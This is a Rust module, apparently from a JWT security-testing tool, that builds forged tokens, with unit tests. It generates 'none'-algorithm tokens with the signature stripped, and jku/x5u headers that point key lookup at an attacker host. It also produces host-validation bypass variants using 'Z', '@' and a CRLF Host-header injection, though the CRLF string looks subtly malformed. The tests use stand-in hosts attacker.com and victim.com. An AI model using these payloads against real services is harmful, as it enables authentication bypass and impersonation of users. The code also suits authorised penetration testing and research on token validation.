// Payload module for JWT attack payloads
use anyhow::Result;
use base64::{engine::general_purpose, Engine};
use log::info;
use serde_json::json;

/// Generate none algorithm payloads
#[allow(dead_code)]
pub fn generate_none_payload(token: &str, alg_value: &str) -> Result<String> {
    // Split token parts
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() < 2 {
        return Err(anyhow::anyhow!("Invalid token format"));
    }

    let claims_part = parts[1];

    // Create header with none algorithm
    let header = json!({
        "alg": alg_value,
        "typ": "JWT"
    });

    let header_json = serde_json::to_string(&header)?;
    info!(
        "Generate {} payload header=\"{}\" payload={}",
        alg_value, header_json, alg_value
    );

    // Encode header to base64
    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());

    // Format as JWT (without signature)
    Ok(format!("{}.{}", encoded_header, claims_part))
}

/// Generate JKU and X5U payloads for URL manipulation attacks
#[allow(dead_code)]
pub fn generate_url_payload(
    token: &str,
    key_type: &str,
    domain: &str,
    trust_domain: Option<&str>,
    protocol: &str,
) -> Result<Vec<String>> {
    let mut payloads = Vec::new();

    // Split token parts
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() < 2 {
        return Err(anyhow::anyhow!("Invalid token format"));
    }

    let claims_part = parts[1];

    // Basic payload
    let header = json!({
        "alg": "hs256",
        key_type: domain,
        "typ": "JWT"
    });

    let header_json = serde_json::to_string(&header)?;
    info!(
        "Generate {} + basic payload header=\"{}\" payload={}",
        key_type, header_json, key_type
    );

    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
    payloads.push(format!("{}.{}", encoded_header, claims_part));

    // If trust domain is provided, generate bypass payloads
    if let Some(trust_domain) = trust_domain {
        // Bypass host validation - Z separator
        let bypass_z_url = format!("{}://{}{}{}", protocol, trust_domain, "Z", domain);
        let header = json!({
            "alg": "hs256",
            key_type: bypass_z_url,
            "typ": "JWT"
        });

        let header_json = serde_json::to_string(&header)?;
        info!(
            "Generate {} host validation payload header=\"{}\" payload={}",
            key_type, header_json, key_type
        );

        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
        payloads.push(format!("{}.{}", encoded_header, claims_part));

        // Bypass host validation - @ separator
        let bypass_at_url = format!("{}://{}@{}", protocol, trust_domain, domain);
        let header = json!({
            "alg": "hs256",
            key_type: bypass_at_url,
            "typ": "JWT"
        });

        let header_json = serde_json::to_string(&header)?;
        info!(
            "Generate {} host validation payload header=\"{}\" payload={}",
            key_type, header_json, key_type
        );

        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
        payloads.push(format!("{}.{}", encoded_header, claims_part));

        // Host header injection with CRLF
        let crlf_url = format!("{}://{}%0d0aHost: {}", protocol, trust_domain, domain);
        let header = json!({
            "alg": "hs256",
            key_type: crlf_url,
            "typ": "JWT"
        });

        let header_json = serde_json::to_string(&header)?;
        info!(
            "Generate {} host header injection (w/CRLF) payload header=\"{}\" payload={}",
            key_type, header_json, key_type
        );

        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
        payloads.push(format!("{}.{}", encoded_header, claims_part));
    }

    Ok(payloads)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::Value;
    use base64::{engine::general_purpose::URL_SAFE_NO_PAD}; // Engine trait itself is not directly used, URL_SAFE_NO_PAD is an instance

    const DUMMY_TOKEN: &str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

    fn get_header_from_token(token_str: &str) -> Option<Value> {
        let parts: Vec<&str> = token_str.split('.').collect();
        if parts.is_empty() { // Should be parts.len() < 1, or more robustly parts.get(0).is_none()
            return None;
        }
        URL_SAFE_NO_PAD
            .decode(parts[0])
            .ok()
            .and_then(|bytes| serde_json::from_slice(&bytes).ok())
    }

    #[test]
    fn test_generate_none_payload_lowercase() {
        let result = generate_none_payload(DUMMY_TOKEN, "none");
        assert!(result.is_ok());
        let token = result.unwrap();
        // The function generate_none_payload currently creates a token with 2 parts (header.payload)
        assert_eq!(token.split('.').count(), 2, "Token should have 2 parts for 'none' alg without signature part explicitly added by the function.");

        let header = get_header_from_token(&token).expect("Failed to decode header from generated token");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "none");
        assert_eq!(header.get("typ").unwrap().as_str().unwrap(), "JWT");
    }

    #[test]
    fn test_generate_none_payload_mixed_case() {
        let result = generate_none_payload(DUMMY_TOKEN, "NonE");
        assert!(result.is_ok());
        let token = result.unwrap();
        let header = get_header_from_token(&token).expect("Failed to decode header from generated token");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "NonE");
    }

    #[test]
    fn test_generate_none_payload_uppercase() {
        let result = generate_none_payload(DUMMY_TOKEN, "NONE");
        assert!(result.is_ok());
        let token = result.unwrap();
        let header = get_header_from_token(&token).expect("Failed to decode header from generated token");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "NONE");
    }

    #[test]
    fn test_generate_none_payload_invalid_token_format() {
        let result = generate_none_payload("invalidtoken", "none"); // Only one part
        assert!(result.is_err(), "Expected error for invalid token format (single part)");

        // For "headeronly.", parts are ["headeronly", ""]. len is 2. generate_none_payload should work.
        let result_no_payload = generate_none_payload("headeronly.", "none");
        assert!(result_no_payload.is_ok(), "Expected Ok for token 'headeronly.', got {:?}", result_no_payload.err());
    }

    #[test]
    fn test_generate_url_payload_jku_basic() {
        let result = generate_url_payload(DUMMY_TOKEN, "jku", "attacker.com", None, "http");
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert_eq!(payloads.len(), 1);
        let header = get_header_from_token(&payloads[0]).expect("Failed to decode header from JKU payload");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "hs256"); // Default alg in function
        assert_eq!(header.get("typ").unwrap().as_str().unwrap(), "JWT");
        assert_eq!(header.get("jku").unwrap().as_str().unwrap(), "attacker.com");
    }

    #[test]
    fn test_generate_url_payload_x5u_with_trust() {
        let result = generate_url_payload(DUMMY_TOKEN, "x5u", "attacker.com", Some("victim.com"), "https");
        assert!(result.is_ok());
        let payloads = result.unwrap();
        // Expected: basic, bypass_z, bypass_at, crlf = 4 payloads
        assert_eq!(payloads.len(), 4, "Unexpected number of payloads for x5u with trust domain");

        // Check basic payload
        let basic_payload = payloads.iter().find(|p| {
            let hdr = get_header_from_token(p).unwrap();
            hdr.get("x5u").unwrap().as_str().unwrap() == "attacker.com"
        }).expect("Basic attacker.com payload not found");
        let basic_header = get_header_from_token(basic_payload).unwrap();
        assert_eq!(basic_header.get("x5u").unwrap().as_str().unwrap(), "attacker.com");

        // Check for one of the bypass payloads (e.g., Z separator)
        assert!(payloads.iter().any(|p| {
            get_header_from_token(p).unwrap().get("x5u").unwrap().as_str().unwrap().contains("victim.comZattacker.com")
        }), "Bypass payload with Z separator not found");
         assert!(payloads.iter().any(|p| {
            get_header_from_token(p).unwrap().get("x5u").unwrap().as_str().unwrap().contains("victim.com@attacker.com")
        }), "Bypass payload with @ separator not found");
        assert!(payloads.iter().any(|p| {
            get_header_from_token(p).unwrap().get("x5u").unwrap().as_str().unwrap().contains("victim.com%0d0aHost: attacker.com")
        }), "Bypass payload with CRLF not found");
    }

    #[test]
    fn test_generate_url_payload_invalid_token_format() {
        // For "invalid.token", parts are ["invalid", "token"]. len is 2. generate_url_payload should work.
        let result = generate_url_payload("invalid.token", "jku", "attacker.com", None, "http");
        assert!(result.is_ok(), "Expected Ok for token 'invalid.token', got {:?}", result.err());

        // Test with a single part token, which should fail
        let result_single_part = generate_url_payload("invalidtoken", "jku", "attacker.com", None, "http");
        assert!(result_single_part.is_err(), "Expected error for single part token in generate_url_payload");
    }

    #[test]
    fn test_generate_all_payloads_basic() {
        let result = generate_all_payloads(DUMMY_TOKEN, None, None, "http");
        assert!(result.is_ok());
        let payloads = result.unwrap();
        // Expected: "none", "NonE", "NONE"
        assert_eq!(payloads.len(), 3, "Expected 3 'none' algorithm payloads");
        assert!(payloads.iter().all(|p| {
            let header = get_header_from_token(p).unwrap();
            header.get("alg").unwrap().as_str().unwrap().to_lowercase() == "none"
        }));
    }

    #[test]
    fn test_generate_all_payloads_with_url_attacks() {
        let result = generate_all_payloads(DUMMY_TOKEN, Some("victim.com"), Some("attacker.com"), "https");
        assert!(result.is_ok(), "generate_all_payloads failed: {:?}", result.err());
        let payloads = result.unwrap();

        // Expected: 3 "none" payloads + 4 "jku" payloads + 4 "x5u" payloads = 11
        assert_eq!(payloads.len(), 3 + 4 + 4, "Unexpected number of total payloads generated");

        assert_eq!(payloads.iter().filter(|p| {
            get_header_from_token(p).unwrap().get("alg").unwrap().as_str().unwrap().to_lowercase() == "none"
        }).count(), 3, "Incorrect number of 'none' payloads");

        assert!(payloads.iter().any(|p| get_header_from_token(p).unwrap().as_object().unwrap().contains_key("jku")), "No JKU payloads found");
        assert!(payloads.iter().any(|p| get_header_from_token(p).unwrap().as_object().unwrap().contains_key("x5u")), "No X5U payloads found");

        // Check if at least one JKU payload has the trust domain bypass
        assert!(payloads.iter().any(|p| {
            let header_val = get_header_from_token(p).unwrap();
            let header = header_val.as_object().unwrap();
            header.contains_key("jku") && header.get("jku").unwrap().as_str().unwrap().contains("victim.com")
        }), "No JKU bypass payload with victim.com found");

        // Check if at least one X5U payload has the trust domain bypass
         assert!(payloads.iter().any(|p| {
            let header_val = get_header_from_token(p).unwrap();
            let header = header_val.as_object().unwrap();
            header.contains_key("x5u") && header.get("x5u").unwrap().as_str().unwrap().contains("victim.com")
        }), "No X5U bypass payload with victim.com found");
    }
}

/// Generate all available payloads for a token
#[allow(dead_code)]
pub fn generate_all_payloads(
    token: &str,
    jwk_trust: Option<&str>,
    jwk_attack: Option<&str>,
    jwk_protocol: &str,
) -> Result<Vec<String>> {
    let mut payloads = Vec::new();

    // None algorithm payloads
    payloads.push(generate_none_payload(token, "none")?);
    payloads.push(generate_none_payload(token, "NonE")?);
    payloads.push(generate_none_payload(token, "NONE")?);

    // URL payloads if attack domain is provided
    if let Some(attack_domain) = jwk_attack {
        // JKU payloads
        let jku_payloads =
            generate_url_payload(token, "jku", attack_domain, jwk_trust, jwk_protocol)?;
        payloads.extend(jku_payloads);

        // X5U payloads
        let x5u_payloads =
            generate_url_payload(token, "x5u", attack_domain, jwk_trust, jwk_protocol)?;
        payloads.extend(x5u_payloads);
    }

    Ok(payloads)
}
